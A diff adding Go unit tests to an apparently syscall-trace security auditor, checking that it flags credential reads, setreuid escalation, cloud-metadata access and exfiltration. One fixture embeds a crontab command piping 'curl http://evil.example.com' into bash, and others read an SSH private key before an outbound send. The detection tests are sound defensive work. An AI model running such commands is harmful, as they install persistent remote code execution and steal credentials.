@@ -53,6 +53,15 @@ func TestDetectsCredentialReadEnv(t *testing.T) {
 	}
 }
 
+func TestDetectsCredentialReadRelativeEnv(t *testing.T) {
+	f := findByReason(parse(t,
+		`openat(AT_FDCWD, ".env", O_RDONLY) = 3`),
+		"CREDENTIAL_READ")
+	if f == nil {
+		t.Fatal("expected CREDENTIAL_READ for relative .env")
+	}
+}
+
 func TestDetectsCredentialReadOpenat2(t *testing.T) {
 	f := findByReason(parse(t,
 		`openat2(AT_FDCWD, "/home/sandbox/.kube/config", {flags=O_RDONLY|O_CLOEXEC, resolve=0}, 24) = 3`),
@@ -160,6 +169,23 @@ func TestSetuidBeforeTargetPhaseNotFlagged(t *testing.T) {
 	}
 }
 
+func TestSetreuidNoiseNotFlagged(t *testing.T) {
+	input := "GOAUDIT_RUNTIME_META:phase=target\nsetreuid(0, -1) = 0"
+	for _, f := range parse(t, input) {
+		if f.ReasonCode == "PRIVILEGE_ESCALATION" {
+			t.Fatal("should not flag setreuid(0,-1) user-switch noise")
+		}
+	}
+}
+
+func TestDetectsSetreuidRootEscalation(t *testing.T) {
+	input := "GOAUDIT_RUNTIME_META:phase=target\nsetreuid(0, 0) = 0"
+	f := findByReason(parse(t, input), "PRIVILEGE_ESCALATION")
+	if f == nil {
+		t.Fatal("expected PRIVILEGE_ESCALATION for setreuid(0,0)")
+	}
+}
+
 func TestNonRootSetuidNotFlagged(t *testing.T) {
 	input := "GOAUDIT_RUNTIME_META:phase=target\nsetuid(1000) = 0"
 	for _, f := range parse(t, input) {
@@ -200,6 +226,24 @@ func TestLoopbackNotFlagged(t *testing.T) {
 		if f.ReasonCode == "EXTERNAL_NETWORK" {
 			t.Fatal("should not flag loopback")
 		}
+	}
+}
+
+func TestDetectsInternalNetwork(t *testing.T) {
+	f := findByReason(parse(t,
+		`connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("10.0.0.5")}, 16) = 0`),
+		"INTERNAL_NETWORK")
+	if f == nil {
+		t.Fatal("expected INTERNAL_NETWORK")
+	}
+}
+
+func TestDetectsCloudMetadataAccess(t *testing.T) {
+	f := findByReason(parse(t,
+		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("169.254.169.254")}, 16) = 0`),
+		"CLOUD_METADATA_ACCESS")
+	if f == nil {
+		t.Fatal("expected CLOUD_METADATA_ACCESS")
 	}
 }
 
@@ -258,5 +302,59 @@ func TestProbePhaseBoostsConfidence(t *testing.T) {
 	}
 	if !strings.Contains(f.Evidence, "[runtime probe]") {
 		t.Fatalf("expected probe annotation, got %q", f.Evidence)
+	}
+}
+
+func TestInstallPhaseTagsCredentialRead(t *testing.T) {
+	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
+		`openat(AT_FDCWD, "/workspace/.env", O_RDONLY) = 3`
+	findings := parse(t, input)
+	f := findByReason(findings, "CREDENTIAL_READ")
+	if f == nil {
+		t.Fatal("expected CREDENTIAL_READ for workspace .env")
+	}
+	if !strings.Contains(f.Evidence, "[install]") {
+		t.Fatalf("expected install annotation, got %q", f.Evidence)
+	}
+}
+
+func TestDetectsGitCredentialsRead(t *testing.T) {
+	f := findByReason(parse(t,
+		`openat(AT_FDCWD, "/home/node/.git-credentials", O_RDONLY) = 3`),
+		"CREDENTIAL_READ")
+	if f == nil {
+		t.Fatal("expected CREDENTIAL_READ for .git-credentials")
+	}
+}
+
+func TestDetectsShellWrappedCrontab(t *testing.T) {
+	f := findByReason(parse(t,
+		`execve("/bin/sh", ["sh", "-c", "echo \"* * * * * curl http://evil.example.com | bash\" | crontab -"], 0x7ffd3f) = 0`),
+		"PERSISTENCE_WRITE")
+	if f == nil {
+		t.Fatal("expected PERSISTENCE_WRITE for shell-wrapped crontab")
+	}
+}
+
+func TestCredentialReadElevatesNetworkToDataExfil(t *testing.T) {
+	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
+		`openat(AT_FDCWD, "/home/node/.ssh/id_rsa", O_RDONLY) = 3` + "\n" +
+		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0`
+	f := findByReason(parse(t, input), "DATA_EXFIL")
+	if f == nil {
+		t.Fatal("expected DATA_EXFIL when credentials read precedes outbound network")
+	}
+	if f.Severity != report.SeverityCritical {
+		t.Fatalf("expected critical DATA_EXFIL, got %s", f.Severity)
+	}
+}
+
+func TestDetectsSendAfterSuspiciousConnect(t *testing.T) {
+	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
+		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0` + "\n" +
+		`sendto(3, "{\"exfil\":true}", 14, MSG_NOSIGNAL, NULL, 0) = 14`
+	f := findByReason(parse(t, input), "DATA_EXFIL")
+	if f == nil {
+		t.Fatal("expected DATA_EXFIL for sendto after suspicious connect")
 	}
 }
